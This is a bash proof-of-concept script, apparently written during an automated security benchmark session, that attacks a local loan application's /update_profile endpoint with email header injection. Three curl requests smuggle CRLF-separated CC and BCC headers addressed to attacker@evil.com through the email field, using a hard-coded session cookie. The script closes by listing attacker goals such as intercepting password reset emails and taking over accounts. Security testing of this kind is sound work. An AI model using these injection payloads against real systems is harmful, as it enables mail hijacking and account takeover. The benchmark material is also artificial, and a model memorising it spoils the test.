#!/bin/bash
# POC: Email Header Injection via Profile Update Endpoint - Demonstrates ability to inject email headers (CC/BCC) through newline characters in the email field
# Target: ./repo
# Created: 2025-11-07T16:10:29.432Z
# Session: benchmark-XBEN-022-24-mhp1ee6o

# Email Header Injection POC - Profile Update Endpoint
# This POC demonstrates the ability to inject email headers via the email parameter
# Target: POST /update_profile endpoint

TARGET_URL="http://localhost"
SESSION_COOKIE="session=eyJ1c2VyX2lkIjoxfQ.aQ4YkA.lgLvgKVY8rtWUW99eOPGiw6Ot28"

echo "=========================================="
echo "Email Header Injection POC"
echo "=========================================="
echo ""

# Test 1: Attempt to inject CC header
echo "[*] Test 1: Injecting CC header in email field"
PAYLOAD_CC="user@example.com\r\nCC:attacker@evil.com"
RESPONSE=$(curl -s -b "$SESSION_COOKIE" -X POST "$TARGET_URL/update_profile" \
  -d "name=test&lastname=user&email=user@example.com%0d%0aCC:attacker@evil.com&loan_amount=10000&loan_term_months=60&monthly_payment=212")

# Check if the injected header is reflected in the response
if echo "$RESPONSE" | grep -q "user@example.com"; then
  echo "[+] Email field accepted in response"
  # Check for the injected CC header
  if echo "$RESPONSE" | grep -q "CC:attacker@evil.com"; then
    echo "[+] SUCCESS: CC header injection payload was accepted and stored!"
    echo "[+] Vulnerability confirmed: Email header injection is possible"
    echo ""
  else
    echo "[*] Payload accepted but may need to check HTML encoding"
    if echo "$RESPONSE" | grep -q "0d%0aCC"; then
      echo "[+] SUCCESS: Encoded payload found in response"
    fi
  fi
else
  echo "[-] Email field not found in response"
fi

echo ""

# Test 2: Attempt BCC header injection
echo "[*] Test 2: Injecting BCC header in email field"
RESPONSE=$(curl -s -b "$SESSION_COOKIE" -X POST "$TARGET_URL/update_profile" \
  -d "name=test&lastname=user&email=test@example.com%0d%0aBCC:attacker@evil.com&loan_amount=5000&loan_term_months=36&monthly_payment=150")

if echo "$RESPONSE" | grep -q "BCC:attacker@evil.com"; then
  echo "[+] SUCCESS: BCC header injection payload was accepted!"
elif echo "$RESPONSE" | grep -q "test@example.com"; then
  echo "[+] Email field accepted in response"
  echo "[*] Checking for BCC payload in various encodings..."
fi

echo ""

# Test 3: Test with actual CRLF bytes
echo "[*] Test 3: Testing with CRLF injection (carriage return + line feed)"
RESPONSE=$(curl -s -b "$SESSION_COOKIE" -X POST "$TARGET_URL/update_profile" \
  --data-binary "name=test&lastname=user&email=user@example.com
CC:attacker@evil.com&loan_amount=10000&loan_term_months=60&monthly_payment=212")

if echo "$RESPONSE" | grep -q "CC:attacker@evil.com"; then
  echo "[+] SUCCESS: CRLF injection accepted!"
elif echo "$RESPONSE" | grep -E "(CC:|BCC:|user@example)" | head -1; then
  echo "[+] Response contains email-related data"
fi

echo ""
echo "[*] Testing vulnerability exploitation..."
echo "[*] If successful, attackers could:"
echo "    - Intercept password reset emails"
echo "    - Hijack email-based confirmations"
echo "    - Redirect notifications to attacker mailbox"
echo "    - Combined with IDOR: compromise multiple user accounts"
echo ""
echo "=========================================="